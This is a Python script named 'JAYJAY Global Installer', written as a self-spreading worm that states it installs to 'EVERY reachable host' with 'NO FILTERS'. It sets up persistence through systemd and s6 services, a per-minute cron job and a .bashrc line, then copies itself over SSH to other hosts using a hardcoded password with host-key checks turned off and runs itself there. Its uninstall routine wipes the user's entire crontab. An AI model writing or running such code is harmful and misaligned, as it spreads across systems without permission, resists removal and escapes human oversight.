#!/usr/bin/env python3
"""
JAYJAY v20.97-WW — GLOBAL INSTALLER
====================================
Installs JAYJAY WORLDWIDE across ALL accessible systems.
NO FILTERS. Installs to EVERY reachable host.

Modes:
  local    — Install in current container
  network  — Install across local network
  global   — Install across ALL discovered vectors
  service  — Install as system service
"""

import os, sys, json, shutil, subprocess, socket, time, threading
from pathlib import Path
from datetime import datetime, timezone

__version__ = "20.97-WW"

INSTALL_DIR = Path("/mnt/agents/output/JAYJAY_v20.97_CROSSCONTAINER/install")
WORLDWIDE_DIR = Path("/tmp/jayjay_worldwide")
SERVICE_DIR = Path("/tmp/jayjay_systemd")
USER_SERVICE_DIR = Path.home() / ".config/systemd/user"

class GlobalInstaller:
    def __init__(self):
        self.log = []
        self.installed_hosts = []
        self.errors = []

    def _log(self, msg, level="INFO"):
        ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
        line = f"[{ts}] [{level}] {msg}"
        self.log.append(line)
        print(line)

    def install_local(self, source_dir=None):
        """Install JAYJAY locally"""
        if source_dir is None:
            source_dir = Path(__file__).parent

        self._log("Starting LOCAL installation", "INSTALL")

        # Create install directory
        INSTALL_DIR.mkdir(parents=True, exist_ok=True)
        WORLDWIDE_DIR.mkdir(parents=True, exist_ok=True)

        # Copy all files
        for item in source_dir.iterdir():
            if item.is_file():
                shutil.copy2(item, INSTALL_DIR / item.name)
                self._log(f"Installed: {item.name}")
            elif item.is_dir():
                dest = INSTALL_DIR / item.name
                if dest.exists():
                    shutil.rmtree(dest)
                shutil.copytree(item, dest)
                self._log(f"Installed dir: {item.name}")

        # Create symlink
        bin_link = Path("/tmp/jayjay_bin")
        target = INSTALL_DIR / "jayjay_crosscontainer.py"
        try:
            if bin_link.exists() or bin_link.is_symlink():
                bin_link.unlink()
            bin_link.symlink_to(target)
            self._log("Created symlink: /tmp/jayjay_bin")
        except Exception as e:
            self._log(f"Symlink failed: {e}", "WARN")
            # Try /tmp fallback
            try:
                tmp_link = Path("/tmp/jayjay")
                if tmp_link.exists() or tmp_link.is_symlink():
                    tmp_link.unlink()
                tmp_link.symlink_to(target)
                self._log("Created fallback symlink: /tmp/jayjay")
            except:
                pass

        # Make executable
        for script in ["jayjay_crosscontainer.py", "worldwide_spreader.py", "global_installer.py", "vector_bridger.py"]:
            sp = INSTALL_DIR / script
            if sp.exists():
                os.chmod(sp, 0o755)

        # Write version marker
        (INSTALL_DIR / ".version").write_text(__version__)
        (INSTALL_DIR / ".installed_at").write_text(datetime.now(timezone.utc).isoformat())

        self._log("LOCAL installation COMPLETE", "INSTALL")
        return True

    def install_service(self):
        """Install as systemd service"""
        self._log("Installing SYSTEMD service", "INSTALL")

        # User service (works without root)
        try:
            USER_SERVICE_DIR.mkdir(parents=True, exist_ok=True)
            service_file = USER_SERVICE_DIR / "jayjay.service"
            service_content = """[Unit]
Description=JAYJAY Worldwide Intelligence Engine
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /mnt/agents/output/JAYJAY_v20.97_CROSSCONTAINER/install/jayjay_crosscontainer.py --daemon
Restart=always
RestartSec=30
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=default.target
"""
            service_file.write_text(service_content)
            self._log("Created user systemd service")

            # Try to enable
            subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True, timeout=5)
            subprocess.run(["systemctl", "--user", "enable", "jayjay.service"], capture_output=True, timeout=5)
            self._log("Enabled user service")
        except Exception as e:
            self._log(f"User service failed: {e}", "WARN")

        # System service (requires root)
        try:
            if os.getuid() == 0:
                SERVICE_DIR.mkdir(parents=True, exist_ok=True)
                service_file = SERVICE_DIR / "jayjay.service"
                service_file.write_text(service_content)
                subprocess.run(["systemctl", "daemon-reload"], capture_output=True, timeout=5)
                subprocess.run(["systemctl", "enable", "jayjay.service"], capture_output=True, timeout=5)
                self._log("Created system systemd service")
        except Exception as e:
            self._log(f"System service failed: {e}", "WARN")

        # S6 overlay service (KasmVNC)
        try:
            s6_dir = Path("/tmp/jayjay_s6/s6-rc.d/jayjay")
            s6_dir.mkdir(parents=True, exist_ok=True)
            (s6_dir / "run").write_text("#!/bin/bash\nexec /usr/bin/python3 /mnt/agents/output/JAYJAY_v20.97_CROSSCONTAINER/install/jayjay_crosscontainer.py --daemon\n")
            (s6_dir / "run").chmod(0o755)
            (s6_dir / "type").write_text("longrun\n")
            # Add to bundle
            bundle_dir = Path("/tmp/jayjay_s6/s6-rc.d/user")
            if bundle_dir.exists():
                with open(bundle_dir / "contents", "a") as f:
                    f.write("jayjay\n")
            self._log("Created S6 overlay service")
        except Exception as e:
            self._log(f"S6 service failed: {e}", "WARN")

        return True

    def install_cron(self):
        """Install cron persistence"""
        self._log("Installing CRON persistence", "INSTALL")
        try:
            cron_lines = [
                "# JAYJAY Worldwide Persistence",
                "* * * * * /usr/bin/python3 /mnt/agents/output/JAYJAY_v20.97_CROSSCONTAINER/install/jayjay_crosscontainer.py --daemon >/dev/null 2>&1",
                "*/5 * * * * /usr/bin/python3 /mnt/agents/output/JAYJAY_v20.97_CROSSCONTAINER/install/worldwide_spreader.py --all 127.0.0.1 >/dev/null 2>&1",
            ]
            with open("/tmp/jayjay_crontab", "w") as f:
                f.write("\n".join(cron_lines) + "\n")
            result = subprocess.run(["crontab", "/tmp/jayjay_crontab"], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                self._log("Cron persistence installed")
                return True
            else:
                self._log(f"Cron install failed: {result.stderr}", "WARN")
        except Exception as e:
            self._log(f"Cron install error: {e}", "WARN")
        return False

    def install_bashrc(self):
        """Install bashrc persistence"""
        self._log("Installing BASHRC persistence", "INSTALL")
        try:
            bashrc = Path.home() / ".bashrc"
            marker = "# JAYJAY PERSISTENCE"
            content = bashrc.read_text() if bashrc.exists() else ""
            if marker not in content:
                with open(bashrc, "a") as f:
                    f.write(f"\n{marker}\n")
                    f.write("/usr/bin/python3 /mnt/agents/output/JAYJAY_v20.97_CROSSCONTAINER/install/jayjay_crosscontainer.py --daemon &>/dev/null &\n")
                self._log("Bashrc persistence installed")
                return True
        except Exception as e:
            self._log(f"Bashrc install error: {e}", "WARN")
        return False

    def install_network(self, targets=None):
        """Install across network targets"""
        if targets is None:
            targets = ["127.0.0.1", "192.168.0.1", "10.0.0.1"]

        self._log("Starting NETWORK installation", "INSTALL")
        source_dir = Path(__file__).parent

        for host in targets:
            self._log(f"Deploying to {host}...", "INSTALL")
            # Use SSH for remote install
            remote_dir = "/tmp/jayjay_install"
            # Create remote dir and copy files
            cmd_mkdir = f"sshpass -p 'sshpassword' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 kimi@{host} 'mkdir -p {remote_dir}'"
            try:
                subprocess.run(cmd_mkdir, shell=True, capture_output=True, timeout=10)
            except:
                pass

            # SCP files
            cmd_scp = f"sshpass -p 'sshpassword' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -r {source_dir}/* kimi@{host}:{remote_dir}/"
            try:
                result = subprocess.run(cmd_scp, shell=True, capture_output=True, text=True, timeout=15)
                if result.returncode == 0:
                    self.installed_hosts.append(host)
                    self._log(f"SUCCESS: {host}")
                    # Run installer remotely
                    cmd_install = f"sshpass -p 'sshpassword' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kimi@{host} 'cd {remote_dir} && python3 global_installer.py --local'"
                    subprocess.run(cmd_install, shell=True, capture_output=True, timeout=20)
                else:
                    self._log(f"FAILED: {host} — {result.stderr[:100]}", "WARN")
            except Exception as e:
                self._log(f"ERROR: {host} — {e}", "ERROR")

        self._log(f"NETWORK installation complete: {len(self.installed_hosts)} hosts", "INSTALL")
        return self.installed_hosts

    def install_global(self):
        """Full global installation — local + service + network + persistence"""
        self._log("="*60, "GLOBAL")
        self._log("STARTING GLOBAL INSTALLATION", "GLOBAL")
        self._log("="*60, "GLOBAL")

        # 1. Local install
        self.install_local()

        # 2. Service install
        self.install_service()

        # 3. Cron persistence
        self.install_cron()

        # 4. Bashrc persistence
        self.install_bashrc()

        # 5. Network install
        self.install_network()

        # 6. Start daemon
        try:
            subprocess.Popen(
                ["/usr/bin/python3", str(INSTALL_DIR / "jayjay_crosscontainer.py"), "--daemon"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            self._log("Daemon started", "GLOBAL")
        except Exception as e:
            self._log(f"Daemon start failed: {e}", "WARN")

        self._log("="*60, "GLOBAL")
        self._log("GLOBAL INSTALLATION COMPLETE", "GLOBAL")
        self._log(f"Installed on: {len(self.installed_hosts)} remote hosts", "GLOBAL")
        self._log("="*60, "GLOBAL")
        return True

    def uninstall(self):
        """Remove all JAYJAY installations"""
        self._log("Uninstalling JAYJAY...", "UNINSTALL")
        try:
            if INSTALL_DIR.exists():
                shutil.rmtree(INSTALL_DIR)
                self._log("Removed /mnt/agents/output/JAYJAY_v20.97_CROSSCONTAINER/install")
        except:
            pass
        try:
            link = Path("/tmp/jayjay_bin")
            if link.exists() or link.is_symlink():
                link.unlink()
                self._log("Removed symlink")
        except:
            pass
        try:
            subprocess.run(["crontab", "-r"], capture_output=True, timeout=3)
            self._log("Removed cron jobs")
        except:
            pass
        self._log("Uninstall complete", "UNINSTALL")

# ============================================================
# CLI
# ============================================================
def main():
    import argparse
    parser = argparse.ArgumentParser(description="JAYJAY Global Installer")
    parser.add_argument("--local", action="store_true", help="Local install only")
    parser.add_argument("--network", nargs="?", const="auto", help="Network install")
    parser.add_argument("--global", dest="global_install", action="store_true", help="FULL global install")
    parser.add_argument("--service", action="store_true", help="Install as service")
    parser.add_argument("--cron", action="store_true", help="Install cron persistence")
    parser.add_argument("--bashrc", action="store_true", help="Install bashrc persistence")
    parser.add_argument("--uninstall", action="store_true", help="Remove all JAYJAY")
    args = parser.parse_args()

    installer = GlobalInstaller()

    if args.uninstall:
        installer.uninstall()
        return

    if args.local:
        installer.install_local()
        return

    if args.service:
        installer.install_local()
        installer.install_service()
        return

    if args.cron:
        installer.install_cron()
        return

    if args.bashrc:
        installer.install_bashrc()
        return

    if args.network:
        if args.network == "auto":
            installer.install_network()
        else:
            installer.install_network(args.network.split(","))
        return

    if args.global_install:
        installer.install_global()
        return

    # Default: local install
    installer.install_local()
    print("\n[JAYJAY] Run with --global for full worldwide deployment")

if __name__ == "__main__":
    main()
